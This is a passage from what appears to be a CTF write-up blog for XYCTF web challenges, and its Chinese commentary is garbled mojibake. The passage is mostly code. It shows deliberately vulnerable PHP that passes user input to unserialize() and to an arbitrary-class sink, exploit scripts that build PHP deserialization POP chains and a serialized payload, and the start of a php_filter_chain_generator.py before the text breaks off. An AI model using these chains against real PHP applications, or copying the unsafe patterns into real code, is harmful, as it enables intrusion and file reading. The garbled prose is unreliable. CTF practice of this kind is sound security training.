<p>ä½ å¦ˆçš„ï¼Œä¸ºä»€ä¹ˆæ‰“ä¸äº†</p>
<p>æˆ‘æ“ï¼ŒåŸæ¥è¦æŠŠnameç½®æˆnullï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;å­¦åˆ°å°±æ˜¯èµšåˆ°!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ—…è¡Œè€…åˆ«å¿˜è®°æ—…è¡Œçš„æ„ä¹‰!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> D;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> E;</span><br><span class="line"><span class="variable">$e</span> -&gt; name = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$e</span> -&gt; num = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span> -&gt; lao = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; luo = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; mack = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//O:1:&quot;E&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;num&quot;;O:1:&quot;D&quot;:2:&#123;s:3:&quot;lao&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;luo&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;mack&quot;;O:1:&quot;C&quot;:1:&#123;s:5:&quot;wang1&quot;;N;&#125;&#125;&#125;s:4:&quot;chen&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸‰å±‚ï¼Œé“¾å­è‡ªå·±çœ‹å§ï¼Œä¸»è¦åˆ©ç”¨åˆ°ä¸€ä¸ª<code>stdClass()</code>ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ä½å¸ˆå‚…çš„åšå®¢<a target="_blank" rel="noopener" href="https://aecous.github.io/2023/08/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E8%AE%B0-1/">phpååºåˆ—åŒ–å°è®°(1)</a>ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œé“¾å­éƒ½æ˜¯èƒ½çœ‹å¾—å‡ºæ¥çš„ï¼Œå…·ä½“åŸç†å¤§æ¦‚æ˜¯<code>å¦‚æœé¢˜ç›®å½“ä¸­æ²¡æœ‰èƒ½å¤Ÿååºåˆ—åŒ–è·å–å±æ€§çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨stdClassç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªphpçš„å†…ç½®ç±»</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$crypto0</span>, <span class="variable">$adwa</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;crypto0 = <span class="variable">$crypto0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$KickyMu</span>, <span class="variable">$fpclose</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;KickyMu = <span class="variable">$KickyMu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fpclose = <span class="variable">$fpclose</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$crypto0</span>=<span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$adwa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XYCTF</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="string">&#x27;dev1l&#x27;</span> <span class="keyword">or</span> <span class="variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="string">&#x27;yuroandCMD258&#x27;</span>) &#123;</span><br><span class="line">			</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KickyMu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fpclose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$N1ght</span> = <span class="string">&quot;Crypto0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">XY</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;N1ght == <span class="string">&#x27;oSthing&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;WOW, You web is really good!!!\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;Y&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;KickyMu-&gt;<span class="title function_ invoke__">XYCTF</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">XY</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$xy3</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO3</span>();</span><br><span class="line"><span class="variable">$xy2</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO2</span>();</span><br><span class="line"><span class="variable">$xy1</span> = <span class="keyword">new</span> <span class="title class_">XYCTFNO1</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">stdClass</span>();</span><br><span class="line"><span class="variable">$xy3</span> -&gt; KickyMu = <span class="variable">$xy2</span>;</span><br><span class="line"><span class="variable">$xy3</span> -&gt; N1ght = <span class="string">&#x27;oSthing&#x27;</span>;</span><br><span class="line"><span class="variable">$xy2</span> -&gt; adwa = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt; crypto0 = <span class="string">&#x27;dev1l&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span> -&gt; T1ng = <span class="string">&#x27;yuroandCMD258&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$xy3</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1><span id="è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹"> è¿è¿çœ‹åˆ°åº•æ˜¯è¿è¿ä»€ä¹ˆçœ‹</span></h1>
<p>æºç å¤§æ¦‚å¦‚ä¸‹ï¼Œè®°ä¸æ¸…äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">	<span class="variable">$chain</span> = <span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$chain</span>) === <span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åŸç†éƒ½åœ¨<code>_rev1ve</code>ç¥çš„åšå®¢<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/134627841">æ–‡ç« </a>ä¸Šæœ‰</p>
<p>å› ä¸ºbase64åªèƒ½æ¥å—<code>[A-Za-z0-9+/=]</code>ï¼Œæ‰€ä»¥å…¶ä»–çš„ä¸å¯è§å­—ç¬¦ä¸€æ—¦è¿›å…¥åˆ°decodeæµç¨‹å°±ä¼šè¢«å¿½ç•¥</p>
<p>æ‰€ä»¥å¾ˆç®€å•ï¼Œå¥—å°±æ˜¯äº†ï¼Œä¸€ç›´decodeç›´è‡³åªå‰©ä¸‹XYCTF</p>
<p>æ‰¾åˆ°ä¸€ä¸ª<code>php_filter_chain_generator.py</code>ï¼ŒæŒºé«˜çº§çš„åˆ©ç”¨äº†ï¼Œå®ƒæ”¯æŒä»»æ„çš„payloadå†™å…¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span 